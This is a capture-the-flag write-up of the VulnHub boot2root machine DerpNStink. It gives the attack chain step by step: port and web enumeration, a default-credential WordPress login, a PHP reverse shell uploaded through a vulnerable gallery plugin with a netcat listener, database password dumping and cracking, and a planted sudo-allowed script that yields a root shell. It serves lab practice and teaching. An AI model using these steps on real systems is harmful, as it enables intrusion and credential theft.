# DerpNStink — VulnHub

**CTF:** VulnHub  
**Date:** 2025-10-20  
**Category:** misc  
**Difficulty:** Grade 2  

---

## Summary

DerpNStink is a boot2root Ubuntu machine by Bryan Smith with 4 flags across the chain. It involves web enumeration, WordPress exploitation via an arbitrary file upload plugin, credential extraction from the database, lateral movement between users, and sudo abuse for root.

---

## Reconnaissance

```bash
nmap -sC -sV -A -p- 192.168.1.x
```

Open ports:

```
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.6.1p1
80/tcp  open  http    Apache 2.4.7
```

---

## Enumeration

### Web — Source Code

Browsing to port 80 showed a basic page. Checking the page source revealed **Flag 1** hidden in an HTML comment.

### robots.txt

```
Disallow: /php/
Disallow: /temporary/
```

`/temporary/` returned a note: `Tryharder`. `/php/` exposed **phpMyAdmin**.

### Directory Bruteforce

```bash
dirb http://192.168.1.x /usr/share/dirb/wordlists/common.txt
```

Found `/weblog/` — but navigating to it redirected to `derpnstink.local`, so updated `/etc/hosts`:

```
192.168.1.x  derpnstink.local
```

Now accessible: a full **WordPress** site.

### WordPress Enumeration

```bash
wpscan --url http://derpnstink.local/weblog/ -e ap,u
```

Found:
- Users: `admin`, `unclestinky`
- Vulnerable plugin: **Slideshow Gallery 1.4.6** — arbitrary file upload

---

## Exploitation — WordPress Plugin File Upload

Logged into WordPress as `admin:admin` (default credentials). Access was limited but the **Slideshow Gallery upload** feature was available.

Uploaded a PHP reverse shell via the gallery management page. Set up a listener:

```bash
nc -lvnp 4444
```

Triggered the shell by visiting the uploaded file URL. Got a shell as `www-data`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement

### Extracting WordPress Credentials

Found `wp-config.php`:

```bash
cat /var/www/html/weblog/wp-config.php
```

Got MySQL credentials. Connected and dumped the `wp_users` table:

```bash
mysql -u USER -pPASS -e "SELECT user_login, user_pass FROM wordpress.wp_users;"
```

Got hashed passwords for both `admin` and `unclestinky`.

### Cracking the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Cracked `unclestinky`'s hash. Used it to SSH as `stinky`:

```bash
ssh stinky@derpnstink.local
```

Found **Flag 2** in stinky's home directory. Also found a network capture file — analyzed it with Wireshark, uncovering **Flag 3** and credentials for `mrderp`.

Switched user:

```bash
su mrderp
```

---

## Privilege Escalation — Sudo Abuse

Checked sudo permissions for `mrderp`:

```bash
sudo -l
```

Output:

```
(root) /home/mrderp/binaries/derpy
```

The `binaries/` directory didn't exist — so created it and planted a malicious `derpy` script:

```bash
mkdir -p /home/mrderp/binaries
echo "#!/bin/bash" > /home/mrderp/binaries/derpy
echo "/bin/bash -i" >> /home/mrderp/binaries/derpy
chmod +x /home/mrderp/binaries/derpy
sudo /home/mrderp/binaries/derpy
```

Got a root shell and read **Flag 4**:

```bash
cat /root/flag.txt
# flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
```

---

## Flags

- **Flag 1** — HTML source of the main page
- **Flag 2** — stinky's home directory
- **Flag 3** — network traffic capture analysis
- **Flag 4** — `/root/flag.txt`
